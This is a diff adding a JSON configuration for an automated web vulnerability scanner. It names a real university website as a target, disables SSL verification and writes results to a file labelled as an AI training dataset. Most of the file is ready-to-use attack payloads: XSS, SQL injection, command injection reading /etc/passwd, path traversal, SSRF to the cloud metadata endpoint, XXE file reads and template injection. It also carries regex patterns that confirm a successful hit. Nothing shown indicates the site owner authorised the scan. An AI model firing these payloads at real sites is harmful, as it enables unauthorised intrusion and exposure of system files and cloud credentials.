@@ -1,0 +1,94 @@
+{
+  "targets": {
+    "urls": [
+      "https://www.uetpeshawar.edu.pk/",
+      "https://example.com"
+    ],
+    "url_file": "urls.txt",
+    "max_depth": 2,
+    "max_urls": 500
+  },
+  
+  "scanning": {
+    "concurrent_requests": 20,
+    "timeout": 15,
+    "delay": 0.3,
+    "follow_redirects": true,
+    "verify_ssl": false
+  },
+
+  "payloads": {
+    "xss": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "'-alert(1)-'",
+      "\"><script>alert('XSS')</script>"
+    ],
+    "sqli": [
+      "' OR '1'='1",
+      "' OR '1'='1' --",
+      "1' AND 1=1 --",
+      "1' AND 1=2 --",
+      "' UNION SELECT NULL--",
+      "1; WAITFOR DELAY '0:0:5'--"
+    ],
+    "command": [
+      "; cat /etc/passwd",
+      "| dir",
+      "$(whoami)",
+      "`id`",
+      "; ping -c 5 127.0.0.1"
+    ],
+    "path_traversal": [
+      "../../../etc/passwd",
+      "..\\..\\..\\windows\\win.ini",
+      "....//....//etc/passwd"
+    ],
+    "idor": ["1", "2", "100", "999", "admin"],
+    "ssrf": [
+      "http://169.254.169.254/latest/meta-data/",
+      "file:///etc/passwd",
+      "http://localhost:22/"
+    ],
+    "xxe": [
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+    ],
+    "ssti": [
+      "{{7*7}}",
+      "${7*7}",
+      "<%= 7*7 %>",
+      "{{config}}",
+      "{{self.__class__.__mro__[1].__subclasses__()}}"
+    ]
+  },
+
+  "detection": {
+    "slow_threshold": 3.0,
+    "error_patterns": {
+      "sql": "sql syntax|mysql_fetch|pg_query|ORA-|SQLite3|SQLSTATE|Warning.*mysql",
+      "xss": "<script[^>]*>alert\\(|javascript:alert|onerror=alert",
+      "command": "root:x:|bin/ls|windows/system32|uid=|gid=",
+      "path": "root:x:|\\[boot loader\\]|/bin/bash|win.ini",
+      "idor": "email|username|phone|credit|ssn",
+      "ssrf": "ami-id|instance-id|localhost|internal",
+      "xxe": "root:x:|\\[boot loader\\]|/bin/bash|win.ini",
+      "ssti": "49|config|subclasses|<class|__builtins__"
+    }
+  },
+
+  "ai_features": {
+    "extract_js": true,
+    "extract_api": true,
+    "extract_dom": true,
+    "extract_headers": true,
+    "extract_semantic": true
+  },
+
+  "output": {
+    "csv_file": "ai_training_dataset.csv",
+    "save_raw_responses": false,
+    "response_dir": "raw_responses"
+  }
+}
